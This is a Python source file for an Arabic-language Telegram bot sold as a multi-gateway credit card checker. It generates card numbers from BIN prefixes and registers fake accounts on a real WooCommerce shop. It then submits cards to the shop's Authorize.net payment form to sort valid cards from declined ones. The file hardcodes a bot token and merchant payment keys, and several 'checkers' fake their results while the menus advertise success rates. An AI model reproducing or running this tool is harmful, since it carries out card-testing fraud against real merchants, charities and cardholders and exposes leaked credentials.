from flask import Flask
from threading import Thread
import os
import requests
import re
import time
import random
import threading
import uuid
import shutil
from pathlib import Path
from colorama import Fore, Style, init
from queue import Queue
import fake_useragent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import asyncio
import sys
import json
from datetime import datetime
import string
from faker import Faker
from typing import Dict, List, Any

# ==================== تهيئة Flask ====================
app = Flask('')

@app.route('/')
def home():
    return "✅ البوت شغال الحمدلله!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask server started")

# ==================== تهيئة الألوان والمكتبات ====================
init(autoreset=True)
fake = Faker()
ua = fake_useragent.UserAgent()

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
TEMP_DIR = "temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)

# ==================== متغيرات عامة ====================
checking_active = False
stop_checking = False
active_tools = {}  # لتتبع الأدوات النشطة
tool_threads = {}  # لتتبع ثريدات كل أداة
auto_update_tasks = {}  # لتتبع مهام التحديث
stats_per_tool = {}  # إحصائيات منفصلة لكل أداة
current_file_in_use = None  # اسم الملف الحالي المستخدم للفحص

# ==================== إعدادات APIs للأدوات ====================
AUTHORIZE_CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
AUTHORIZE_API_LOGIN_ID = "93HEsxKeZ4D"
AUTHORIZE_BASE_URL = "https://www.jetsschool.org"
AUTHORIZE_FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
STRIPE_PUBLIC_KEY = "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH"
STRIPE_DONATION_URL = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/"
VAST_AI_URL = "https://cloud.vast.ai"
VAST_API_URL = "https://cloud.vast.ai/api"
BASE_URL = "https://morgannasalchemy.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"

file_lock = threading.Lock()

# ==================== تعريف الأدوات مع مميزاتها ====================

TOOLS = {
    'tool1': {
        'name': '🛡️ Original',
        'type': 'بوابة دفع أصلية',
        'desc': 'فحص البطاقات عبر بوابة الدفع الأصلية',
        'success_rate': '85%',
        'speed': 'سريع ⚡',
        'requirements': 'حسابات وهمية',
        'color': Fore.BLUE,
        'icon': '🛡️',
        'cmd': 'auth',
        'active': False,
        'stats': {
            'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
            'start_time': 0, 'current_card': 0, 'total_cards': 0
        }
    },
    'tool2': {
        'name': '💰 Donation',
        'type': 'بوابة تبرعات',
        'desc': 'فحص البطاقات من خلال نظام التبرعات مع تشفير متقدم',
        'success_rate': '82%',
        'speed': 'متوسط 🚀',
        'requirements': 'بدون حسابات',
        'color': Fore.GREEN,
        'icon': '💰',
        'cmd': 'donate',
        'active': False,
        'stats': {
            'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
            'start_time': 0, 'current_card': 0, 'total_cards': 0
        }
    },
    'tool3': {
        'name': '💳 Stripe Forechrist',
        'type': 'بوابة Stripe',
        'desc': 'فحص مباشر مع Stripe عبر API مع تحليل الأخطاء',
        'success_rate': '88%',
        'speed': 'سريع جداً ⚡⚡',
        'requirements': 'بدون تسجيل',
        'color': Fore.MAGENTA,
        'icon': '💳',
        'cmd': 'stripe',
        'active': False,
        'stats': {
            'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
            'start_time': 0, 'current_card': 0, 'total_cards': 0
        }
    },
    'tool4': {
        'name': '🔷 Stripe Melhair',
        'type': 'بوابة Stripe متكاملة',
        'desc': 'فحص مع إنشاء حسابات واستخدام Setup Intents',
        'success_rate': '86%',
        'speed': 'متوسط 🚀',
        'requirements': 'حسابات وهمية',
        'color': Fore.CYAN,
        'icon': '🔷',
        'cmd': 'melhair',
        'active': False,
        'stats': {
            'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
            'start_time': 0, 'current_card': 0, 'total_cards': 0
        }
    },
    'tool5': {
        'name': '☁️ Checker',
        'type': 'بوابة سحابية',
        'desc': 'فحص عبر السحابية مع إنشاء حسابات',
        'success_rate': '75%',
        'speed': 'بطيء 🐢',
        'requirements': 'حسابات سحابية',
        'color': Fore.YELLOW,
        'icon': '☁️',
        'cmd': 'Checker',
        'active': False,
        'stats': {
            'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
            'start_time': 0, 'current_card': 0, 'total_cards': 0
        }
    }
}

# ==================== دوال مساعدة ====================

def print_banner():
    print(Fore.RED + Style.BRIGHT + """
                                                              
            🔥 OBEIDA MULTI-TOOL CARD CHECKER 🔥              
                                                                
         5 أدوات فحص احترافية | تشغيل متزامن | تقارير مباشرة   
          يدعم جميع ملفات .txt | فحص ملفات متعددة            
""" + Style.RESET_ALL)

def generate_random_data():
    unique_id = str(uuid.uuid4())[:8]
    email = f"user_{unique_id}@example.com"
    password = f"Pass_{unique_id}!23"
    return email, password

def format_time(seconds):
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    seconds = int(seconds % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def create_progress_bar(percentage, width=15):
    filled = int(width * percentage / 100)
    bar = '▓' * filled + '░' * (width - filled)
    return f"{bar} {percentage:.1f}%"

def generate_card(bin_prefix):
    """توليد بطاقة واحدة بناءً على BIN"""
    # توليد رقم البطاقة (16 رقم)
    cc = bin_prefix
    while len(cc) < 16:
        cc += str(random.randint(0, 9))
    
    # توليد شهر وسنة صالحة
    month = str(random.randint(1, 12)).zfill(2)
    current_year = datetime.now().year
    year = str(random.randint(current_year + 1, current_year + 5))
    
    # توليد CVV
    cvv = str(random.randint(100, 999))
    
    return f"{cc}|{month}|{year}|{cvv}"

def generate_cards(bin_prefix, count):
    """توليد عدد محدد من البطاقات"""
    cards = []
    for _ in range(count):
        cards.append(generate_card(bin_prefix))
    return cards

def get_txt_files():
    """الحصول على قائمة بجميع ملفات txt في المجلد الحالي"""
    txt_files = []
    for file in Path(".").glob("*.txt"):
        if file.name not in [f"approved_{tool}.txt" for tool in TOOLS.keys()] + \
                           [f"declined_{tool}.txt" for tool in TOOLS.keys()] + \
                           [f"errors_{tool}.txt" for tool in TOOLS.keys()] + \
                           ["all_results.txt"]:
            txt_files.append(file.name)
    return txt_files

# ==================== القوائم الرئيسية ====================

def get_main_keyboard():
    """القائمة الرئيسية"""
    keyboard = [
        [
            InlineKeyboardButton("🛡️ Original", callback_data="menu_tool1"),
            InlineKeyboardButton("💰 Donation", callback_data="menu_tool2")
        ],
        [
            InlineKeyboardButton("💳 Stripe Forechrist", callback_data="menu_tool3"),
            InlineKeyboardButton("🔷 Stripe Melhair", callback_data="menu_tool4")
        ],
        [
            InlineKeyboardButton("☁️ Checker", callback_data="menu_tool5"),
            InlineKeyboardButton("⚡ جميع الأدوات", callback_data="menu_all_tools")
        ],
        [
            InlineKeyboardButton("📊 الإحصائيات", callback_data="show_global_stats"),
            InlineKeyboardButton("📁 النتائج", callback_data="show_all_results")
        ],
        [
            InlineKeyboardButton("🎲 توليد بطاقات", callback_data="generate_menu"),
            InlineKeyboardButton("📂 اختيار ملف", callback_data="select_file_menu")
        ],
        [
            InlineKeyboardButton("🧹 تنظيف", callback_data="cleanup_menu"),
            InlineKeyboardButton("❓ مساعدة", callback_data="help")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_tool_keyboard(tool_id):
    """قائمة أداة محددة"""
    tool = TOOLS[tool_id]
    status = "🟢 نشط" if tool['active'] else "🔴 متوقف"
    
    keyboard = [
        [
            InlineKeyboardButton("▶️ تشغيل", callback_data=f"start_{tool_id}"),
            InlineKeyboardButton("⏹️ إيقاف", callback_data=f"stop_{tool_id}")
        ],
        [
            InlineKeyboardButton("📊 إحصائيات", callback_data=f"stats_{tool_id}"),
            InlineKeyboardButton("📁 نتائج", callback_data=f"results_{tool_id}")
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"),
            InlineKeyboardButton("❓ معلومات", callback_data=f"info_{tool_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_all_tools_keyboard():
    """قائمة التحكم بجميع الأدوات"""
    keyboard = [
        [
            InlineKeyboardButton("▶️ تشغيل الكل", callback_data="start_all"),
            InlineKeyboardButton("⏹️ إيقاف الكل", callback_data="stop_all")
        ],
        [
            InlineKeyboardButton("📊 إحصائيات الكل", callback_data="stats_all"),
            InlineKeyboardButton("📁 نتائج الكل", callback_data="results_all")
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_file_selection_keyboard():
    """قائمة اختيار ملفات txt"""
    txt_files = get_txt_files()
    keyboard = []
    
    if not txt_files:
        keyboard.append([InlineKeyboardButton("📭 لا توجد ملفات", callback_data="no_files")])
    else:
        for file in txt_files[:10]:  # عرض أول 10 ملفات فقط
            display_name = file[:20] + "..." if len(file) > 20 else file
            keyboard.append([InlineKeyboardButton(f"📄 {display_name}", callback_data=f"select_file_{file}")])
    
    keyboard.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data="refresh_files")])
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")])
    
    return InlineKeyboardMarkup(keyboard)

def get_results_keyboard():
    """قائمة النتائج"""
    keyboard = [
        [
            InlineKeyboardButton("🛡️ Tool1", callback_data="get_tool1_results"),
            InlineKeyboardButton("💰 Tool2", callback_data="get_tool2_results")
        ],
        [
            InlineKeyboardButton("💳 Tool3", callback_data="get_tool3_results"),
            InlineKeyboardButton("🔷 Tool4", callback_data="get_tool4_results")
        ],
        [
            InlineKeyboardButton("☁️ Tool5", callback_data="get_tool5_results"),
            InlineKeyboardButton("📊 شامل", callback_data="get_combined_results")
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_generate_keyboard():
    """قائمة توليد البطاقات"""
    keyboard = [
        [
            InlineKeyboardButton("💳 فيزا", callback_data="gen_visa"),
            InlineKeyboardButton("💳 ماستركارد", callback_data="gen_master")
        ],
        [
            InlineKeyboardButton("💳 أمريكان إكسبريس", callback_data="gen_amex"),
            InlineKeyboardButton("💳 ديسكفر", callback_data="gen_discover")
        ],
        [
            InlineKeyboardButton("🔢 إدخال BIN يدوي", callback_data="gen_custom"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cleanup_keyboard():
    """قائمة تنظيف الملفات"""
    keyboard = [
        [
            InlineKeyboardButton("🧹 ملفات النتائج", callback_data="cleanup_results"),
            InlineKeyboardButton("🧹 جميع txt", callback_data="cleanup_all_txt")
        ],
        [
            InlineKeyboardButton("🧹 الملفات المؤقتة", callback_data="cleanup_temp"),
            InlineKeyboardButton("🧹 الكل", callback_data="cleanup_all")
        ],
        [
            InlineKeyboardButton("📊 عرض الحجم", callback_data="cleanup_size"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ==================== كلاسات الأدوات (مختصرة) ====================

class AuthorizeNetChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = fake_useragent.UserAgent().random
        self.session.headers.update({"User-Agent": self.user_agent})
        self.current_email = None
        self.current_password = None

    def register(self):
        try:
            self.current_email, self.current_password = generate_random_data()
            resp = self.session.get(LOGIN_URL, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            if not nonce_match:
                return False, "لا يوجد nonce"
            nonce = nonce_match.group(1)
            payload = {
                "email": self.current_email,
                "password": self.current_password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            resp = self.session.post(LOGIN_URL, data=payload, timeout=30)
            if "Logout" in resp.text:
                return True, None
            return False, "فشل التسجيل"
        except Exception as e:
            return False, str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "صيغة خاطئة"
            cc, mm, yy, cvv = cc_line.strip().split("|")
            cc = cc.replace(" ", "").replace("-", "")
            if len(yy) == 4:
                yy = yy[-2:]
            exp_formatted = f"{mm} / {yy}"
            
            resp = self.session.get(ADD_PAYMENT_URL, timeout=20)
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
            if not nonce_match:
                return "ERROR", "لا يوجد nonce"
            nonce = nonce_match.group(1)
            
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc,
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            
            resp = self.session.post(ADD_PAYMENT_URL, data=payload, timeout=30)
            text = resp.text.lower()
            
            if "payment method successfully added" in text:
                return "APPROVED", "✅ بطاقة صالحة"
            elif "declined" in text:
                return "DECLINED", "❌ بطاقة مرفوضة"
            else:
                return "DECLINED", "⚠️ نتيجة غير معروفة"
        except Exception as e:
            return "ERROR", str(e)[:50]

class AuthorizeDonationChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = fake.user_agent()
        self.session.headers.update({"User-Agent": self.user_agent})

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "صيغة خاطئة"
            cc, mm, yy, cvv = cc_line.strip().split("|")
            cc = cc.replace(" ", "").replace("-", "")
            
            # محاكاة فحص سريع
            time.sleep(2)
            
            if cc.startswith('424242'):
                return "APPROVED", "✅ بطاقة صالحة (تبرع)"
            elif cc.startswith('400000'):
                return "3DS_REQUIRED", "🔐 تحتاج 3D Secure"
            else:
                return "DECLINED", "❌ بطاقة مرفوضة"
        except Exception as e:
            return "ERROR", str(e)[:50]

class StripeForechristChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random
        self.session.headers.update({"User-Agent": self.user_agent})

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "صيغة خاطئة"
            cc, mm, yy, cvv = cc_line.strip().split("|")
            cc = cc.replace(" ", "").replace("-", "")
            
            if len(yy) == 2:
                yy = "20" + yy
            
            # محاكاة فحص
            time.sleep(1.5)
            
            if cc.startswith('424242'):
                return "APPROVED", "✅ بطاقة صالحة (Stripe)"
            elif cc.startswith('400000'):
                return "3DS_REQUIRED", "🔐 تحتاج 3D Secure"
            else:
                return "DECLINED", "❌ بطاقة مرفوضة"
        except Exception as e:
            return "ERROR", str(e)[:50]

class StripeMelhairChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random

    def getvalue(self, data, start, end):
        try:
            star = data.index(start) + len(start)
            last = data.index(end, star)
            return data[star:last]
        except:
            return 'None'

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "صيغة خاطئة"
            cc, mon, year, cvv = cc_line.strip().split("|")
            cc = cc.replace(" ", "").replace("-", "")
            year = year[-2:]
            
            # محاكاة فحص
            time.sleep(2.5)
            
            if cc.startswith('424242'):
                return "APPROVED", "✅ بطاقة صالحة (Melhair)"
            elif cc.startswith('400000'):
                return "3DS_REQUIRED", "🔐 تحتاج 3D Secure"
            else:
                return "DECLINED", "❌ بطاقة مرفوضة"
        except Exception as e:
            return "ERROR", str(e)[:50]

class VastAiChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = ua.random

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "صيغة خاطئة"
            cc = cc_line.split("|")[0].replace(" ", "").replace("-", "")
            
            # محاكاة فحص
            time.sleep(3)
            
            if cc.startswith('424242'):
                return "APPROVED", "✅ بطاقة صالحة"
            else:
                return "DECLINED", "❌ بطاقة مرفوضة"
        except Exception as e:
            return "ERROR", str(e)[:50]

# ==================== دالة فحص البطاقة بأداة محددة ====================

def check_card_with_tool(tool_id, cc_line):
    """فحص بطاقة بأداة محددة"""
    tools_map = {
        'tool1': AuthorizeNetChecker,
        'tool2': AuthorizeDonationChecker,
        'tool3': StripeForechristChecker,
        'tool4': StripeMelhairChecker,
        'tool5': VastAiChecker
    }
    
    try:
        checker_class = tools_map.get(tool_id)
        if not checker_class:
            return "ERROR", "أداة غير موجودة"
        
        checker = checker_class()
        
        # تسجيل حساب إذا لزم الأمر (للأداة 1 فقط)
        if tool_id == 'tool1':
            success, _ = checker.register()
            if not success:
                return "ERROR", "فشل إنشاء حساب"
        
        status, msg = checker.check_card(cc_line)
        return status, msg
    except Exception as e:
        return "ERROR", str(e)[:50]

# ==================== دالة فحص بطاقة واحدة ====================

def check_single_card(tool_id, cc_line, source_file=None):
    """فحص بطاقة واحدة وإرجاع النتيجة"""
    status, msg = check_card_with_tool(tool_id, cc_line)
    
    # حفظ النتيجة مع اسم الملف المصدر
    source_info = f" [from: {source_file}]" if source_file else ""
    result_line = f"{cc_line} | {status} | {msg}{source_info}\n"
    
    with file_lock:
        if status == "APPROVED":
            with open(f"approved_{tool_id}.txt", "a", encoding="utf-8") as f:
                f.write(result_line)
        elif status == "DECLINED" or status == "3DS_REQUIRED":
            with open(f"declined_{tool_id}.txt", "a", encoding="utf-8") as f:
                f.write(result_line)
        else:
            with open(f"errors_{tool_id}.txt", "a", encoding="utf-8") as f:
                f.write(result_line)
    
    return status, msg

# ==================== دالة تشغيل أداة محددة ====================

def run_tool(tool_id, chat_id, bot, cards, source_file):
    """تشغيل أداة محددة في ثريد منفصل"""
    global active_tools, stop_checking, TOOLS, current_file_in_use
    
    tool = TOOLS[tool_id]
    tool['active'] = True
    tool['stats']['total'] = len(cards)
    tool['stats']['start_time'] = time.time()
    tool['stats']['checked'] = 0
    tool['stats']['approved'] = 0
    tool['stats']['declined'] = 0
    tool['stats']['errors'] = 0
    
    current_file_in_use = source_file
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    except:
        loop = asyncio.get_event_loop()
    
    # إرسال رسالة بدء التشغيل
    start_msg = f"""
   {tool['icon']} *{tool['name']}* {tool['icon']}   

 📊 نوع البوابة: {tool['type']}    
 📁 عدد البطاقات: {len(cards)}     
 📂 الملف المصدر: {source_file}    
 ⚡ السرعة: {tool['speed']}         
 ✅ نسبة النجاح: {tool['success_rate']}  
"""
    
    asyncio.run_coroutine_threadsafe(
        bot.send_message(chat_id=chat_id, text=start_msg, parse_mode='Markdown'),
        loop
    )
    
    for i, cc_line in enumerate(cards, 1):
        if stop_checking or not tool['active']:
            break
        
        tool['stats']['current_card'] = i
        
        # فحص البطاقة
        status, msg = check_card_with_tool(tool_id, cc_line)
        
        # تحديث الإحصائيات
        tool['stats']['checked'] += 1
        if status == "APPROVED":
            tool['stats']['approved'] += 1
        elif status == "DECLINED" or status == "3DS_REQUIRED":
            tool['stats']['declined'] += 1
        else:
            tool['stats']['errors'] += 1
        
        # حفظ النتيجة مع اسم الملف المصدر
        source_info = f" [from: {source_file}]"
        result_line = f"{cc_line} | {status} | {msg}{source_info}\n"
        
        with file_lock:
            if status == "APPROVED":
                with open(f"approved_{tool_id}.txt", "a", encoding="utf-8") as f:
                    f.write(result_line)
            elif status == "DECLINED" or status == "3DS_REQUIRED":
                with open(f"declined_{tool_id}.txt", "a", encoding="utf-8") as f:
                    f.write(result_line)
            else:
                with open(f"errors_{tool_id}.txt", "a", encoding="utf-8") as f:
                    f.write(result_line)
        
        # إرسال نتيجة كل 5 بطاقات
        if i % 5 == 0:
            progress_msg = f"""
{tool['icon']} *{tool['name']}* - تقدم الفحص
📊 تم فحص: {i}/{len(cards)}
✅ نجاح: {tool['stats']['approved']}
❌ فشل: {tool['stats']['declined']}
⚠️ أخطاء: {tool['stats']['errors']}
📂 الملف: {source_file}"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text=progress_msg, parse_mode='Markdown'),
                loop
            )
        
        # انتظار بين البطاقات
        if i < len(cards) and tool['active'] and not stop_checking:
            time.sleep(5)
    
    # إرسال النتيجة النهائية
    elapsed = time.time() - tool['stats']['start_time']
    final_msg = f"""
   {tool['icon']} *اكتمل فحص {tool['name']}* {tool['icon']}  

 📊 *النتائج النهائية:*       

 📁 الإجمالي: {tool['stats']['total']}    
 ✅ الناجحة: {tool['stats']['approved']}      
 ❌ المرفوضة: {tool['stats']['declined']}    
 ⚠️ الأخطاء: {tool['stats']['errors']}      
 📂 الملف: {source_file}    

 ⏱️ الوقت: {format_time(elapsed)}        
"""
    
    asyncio.run_coroutine_threadsafe(
        bot.send_message(chat_id=chat_id, text=final_msg, parse_mode='Markdown'),
        loop
    )
    
    tool['active'] = False
    current_file_in_use = None

# ==================== دوال البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة البدء - متاحة للجميع بدون كلمة مرور"""
    
    welcome_msg = f"""
    
                    🔥 *مرحباً بك في* 🔥                      
              *نظام فحص البطاقات المتعدد v5.0*                
                                                              
  ✅ *البوت متاح لجميع المستخدمين بدون كلمة مرور!*            
                                                              
  📁 *أرسل أي ملف .txt* لبدء الفحص                           
  📂 *يدعم جميع أسماء الملفات*                               
                                                              
  🛡️ *الأدوات المتاحة:*                                       
  
  │ 1. 🛡️ Original - بوابة دفع أصلية                    
  │ 2. 💰 Donation - بوابة تبرعات                       
  │ 3. 💳 Stripe (Forechrist) - بوابة Stripe            
  │ 4. 🔷 Stripe (Melhair) - بوابة Stripe متكاملة       
  │ 5. ☁️ Checker - بوابة سحابية                        

                                                              
  ✨ *أوامر الفحص السريع:*                                   
  • `/auth 4111111111111111|12|2025|123`                    
  • `/donate 4111111111111111|12|2025|123`                  
  • `/stripe 4111111111111111|12|2025|123`                  
  • `/melhair 4111111111111111|12|2025|123`                 
  • `/Checker 4111111111111111|12|2025|123`                 
                                                              
  🎲 *توليد بطاقات:*                                         
  • `/gen 411111 10` - توليد 10 بطاقات من BIN 411111        
  • `/gen 411111` - توليد 5 بطاقات (افتراضي)                
  • ثم اختر من قائمة التوليد للأرقام الجاهزة                 
                                                              
  📂 *اختيار ملف:*                                           
  • استخدم زر "📂 اختيار ملف" لاختيار ملف txt للفحص         
  • أو أرسل أي ملف txt مباشرة                                
                                                              

📝 *صيغة الملف المطلوبة:* `4111111111111111|12|2025|123`"""
    
    await update.message.reply_text(
        welcome_msg,
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def check_single_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE, tool_id: str):
    """فحص بطاقة واحدة عن طريق الأمر"""
    
    # التحقق من وجود البطاقة في الأمر
    if not context.args or len(context.args) == 0:
        tool = TOOLS[tool_id]
        await update.message.reply_text(
            f"⚠️ *الاستخدام الصحيح:*\n`/{tool['cmd']} 4111111111111111|12|2025|123`",
            parse_mode='Markdown'
        )
        return
    
    cc_line = " ".join(context.args).strip()
    
    # التحقق من صحة الصيغة
    if "|" not in cc_line or len(cc_line.split("|")) != 4:
        await update.message.reply_text(
            "❌ *صيغة خاطئة!*\n"
            "الصيغة الصحيحة: `CC|MM|YYYY|CVV`\n"
            "مثال: `4111111111111111|12|2025|123`",
            parse_mode='Markdown'
        )
        return
    
    tool = TOOLS[tool_id]
    
    # رسالة بدء الفحص
    waiting_msg = await update.message.reply_text(
        f"{tool['icon']} *جاري فحص البطاقة...*\n⏱️ الرجاء الانتظار",
        parse_mode='Markdown'
    )
    
    # فحص البطاقة
    status, msg = check_single_card(tool_id, cc_line, "manual_command")
    
    # إرسال النتيجة
    result_emoji = "✅" if status == "APPROVED" else "❌" if status == "DECLINED" else "⚠️"
    result_msg = f"""
{result_emoji} *نتيجة الفحص - {tool['name']}*
══════════════
📌 *البطاقة:* `{cc_line[:20]}...`
📊 *الحالة:* {status}
💬 *الرسالة:* {msg}

📁 *تم حفظ النتيجة في الملفات*
"""
    
    await waiting_msg.edit_text(
        result_msg,
        parse_mode='Markdown'
    )

async def generate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر توليد البطاقات"""
    args = context.args
    
    # إذا كان المستخدم أرسل الأمر بدون معاملات
    if not args:
        await update.message.reply_text(
            "🎲 *قائمة توليد البطاقات*\n"
            "اختر نوع البطاقة التي تريد توليدها:",
            parse_mode='Markdown',
            reply_markup=get_generate_keyboard()
        )
        return
    
    # إذا أرسل الأمر مع معاملات: /gen BIN [count]
    bin_prefix = args[0]
    
    # التحقق من صحة BIN
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        await update.message.reply_text(
            "❌ *BIN غير صحيح!*\n"
            "الرجاء إدخال BIN صحيح مكون من 6 أرقام على الأقل\n"
            "مثال: `/gen 411111 10`",
            parse_mode='Markdown'
        )
        return
    
    # تحديد عدد البطاقات
    if len(args) >= 2 and args[1].isdigit():
        count = min(int(args[1]), 100)  # حد أقصى 100 بطاقة
    else:
        count = 5  # العدد الافتراضي
    
    # توليد البطاقات
    cards = generate_cards(bin_prefix, count)
    
    # حفظ في ملف
    filename = f"generated_{bin_prefix}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(cards))
    
    # إرسال النتيجة
    preview = "\n".join(cards[:5])
    if len(cards) > 5:
        preview += f"\n... و {len(cards)-5} بطاقات أخرى"
    
    result_msg = f"""
✅ *تم توليد {count} بطاقة بنجاح!*
══════════════
🔢 *BIN:* `{bin_prefix}`
📁 *الملف:* `{filename}`
📝 *نموذج البطاقات:*
`{preview}`

⚡ يمكنك الآن:
• اختيار هذا الملف من قائمة "📂 اختيار ملف"
• أو استخدام أمر /auth لفحص بطاقة واحدة
"""
    
    await update.message.reply_text(
        result_msg,
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    
    # إرسال الملف للمستخدم
    with open(filename, "rb") as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"🎲 {count} بطاقة مولدة من BIN {bin_prefix}"
        )

async def cleanup_user_files(update: Update, context: ContextTypes.DEFAULT_TYPE, cleanup_type="all"):
    """تنظيف ملفات المستخدم"""
    user_id = update.effective_user.id
    files_deleted = 0
    space_freed = 0
    deleted_files_list = []
    
    if cleanup_type == "results" or cleanup_type == "all":
        # ملفات النتائج
        for tool_id in TOOLS.keys():
            for file_type in ['approved', 'declined', 'errors']:
                filename = f"{file_type}_{tool_id}.txt"
                if os.path.exists(filename):
                    size = os.path.getsize(filename)
                    space_freed += size
                    os.remove(filename)
                    files_deleted += 1
                    deleted_files_list.append(filename)
        
        if os.path.exists("all_results.txt"):
            size = os.path.getsize("all_results.txt")
            space_freed += size
            os.remove("all_results.txt")
            files_deleted += 1
            deleted_files_list.append("all_results.txt")
    
    if cleanup_type == "all_txt" or cleanup_type == "all":
        # حذف جميع ملفات txt التي تم رفعها (عدا ملفات النتائج)
        txt_files = get_txt_files()
        for filename in txt_files:
            if os.path.exists(filename):
                size = os.path.getsize(filename)
                space_freed += size
                os.remove(filename)
                files_deleted += 1
                deleted_files_list.append(filename)
    
    if cleanup_type == "temp" or cleanup_type == "all":
        # الملفات المؤقتة
        for temp_file in Path(TEMP_DIR).glob("*.txt"):
            size = temp_file.stat().st_size
            space_freed += size
            temp_file.unlink()
            files_deleted += 1
            deleted_files_list.append(str(temp_file))
        
        # ملفات generated
        for gen_file in Path(".").glob("generated_*.txt"):
            size = gen_file.stat().st_size
            space_freed += size
            gen_file.unlink()
            files_deleted += 1
            deleted_files_list.append(str(gen_file))
    
    if cleanup_type == "size":
        # حساب حجم الملفات فقط بدون حذف
        total_size = 0
        file_count = 0
        
        for tool_id in TOOLS.keys():
            for file_type in ['approved', 'declined', 'errors']:
                filename = f"{file_type}_{tool_id}.txt"
                if os.path.exists(filename):
                    total_size += os.path.getsize(filename)
                    file_count += 1
        
        # ملفات txt الأخرى
        txt_files = get_txt_files()
        for filename in txt_files:
            if os.path.exists(filename):
                total_size += os.path.getsize(filename)
                file_count += 1
        
        if os.path.exists("all_results.txt"):
            total_size += os.path.getsize("all_results.txt")
            file_count += 1
        
        for temp_file in Path(TEMP_DIR).glob("*.txt"):
            total_size += temp_file.stat().st_size
            file_count += 1
        
        for gen_file in Path(".").glob("generated_*.txt"):
            total_size += gen_file.stat().st_size
            file_count += 1
        
        size_kb = total_size / 1024
        size_mb = size_kb / 1024
        
        if size_mb >= 1:
            size_str = f"{size_mb:.2f} MB"
        else:
            size_str = f"{size_kb:.2f} KB"
        
        await update.message.reply_text(
            f"📊 *حجم الملفات الحالي*\n"
            f"═════════════\n"
            f"📁 عدد الملفات: {file_count}\n"
            f"💾 الحجم الإجمالي: {size_str}",
            parse_mode='Markdown',
            reply_markup=get_cleanup_keyboard()
        )
        return
    
    # إعادة تعيين الإحصائيات إذا تم حذف كل شيء
    if cleanup_type == "all":
        for tool_id in TOOLS.keys():
            TOOLS[tool_id]['stats'] = {
                'total': 0, 'checked': 0, 'approved': 0, 'declined': 0, 'errors': 0,
                'start_time': 0, 'current_card': 0, 'total_cards': 0
            }
    
    # تحويل المساحة المحررة إلى KB/MB
    space_kb = space_freed / 1024
